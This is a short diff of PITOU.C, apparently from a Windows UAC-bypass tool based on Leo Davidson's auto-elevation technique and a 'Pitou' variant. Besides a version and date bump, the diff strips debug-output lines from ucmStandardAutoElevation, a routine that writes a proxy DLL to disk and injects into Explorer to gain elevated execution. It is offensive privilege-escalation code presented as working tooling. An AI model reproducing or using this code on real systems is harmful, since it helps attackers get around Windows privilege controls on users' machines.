@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     1.80
+*  VERSION:     1.90
 *
-*  DATE:        11 Jul 2015
+*  DATE:        17 Sept 2015
 *
 *  Leo Davidson work based AutoElevation and Pitou new variant.
 *
@@ -256,7 +256,6 @@ BOOL ucmStandardAutoElevation(
 	)
 {
 	BOOL		cond = FALSE, bResult = FALSE;
-	//HINSTANCE   hKrnl, hOle32, hShell32;
 	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
 	WCHAR		szBuffer[MAX_PATH + 1];
 
@@ -310,7 +309,6 @@ BOOL ucmStandardAutoElevation(
 		{
 			break;
 		}
-		OutputDebugStringW(g_ElevParams.SourceFilePathAndName);
 
 		if (!supWriteBufferToFile(g_ElevParams.SourceFilePathAndName, 
 			ProxyDll, ProxyDllSize))
@@ -328,8 +326,6 @@ BOOL ucmStandardAutoElevation(
 			break;
 		}
 		
-		OutputDebugStringW(g_ElevParams.DestinationDir);
-
 		//target
 		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
 		_strcpy_w(szBuffer, lpTargetProcess);
@@ -339,7 +335,6 @@ BOOL ucmStandardAutoElevation(
 		{
 			break;
 		}
-		OutputDebugStringW(g_ElevParams.ExePathAndName);
 
 		bResult = ucmInjectExplorer(&g_ElevParams, ucmElevatedLoadProc);
 
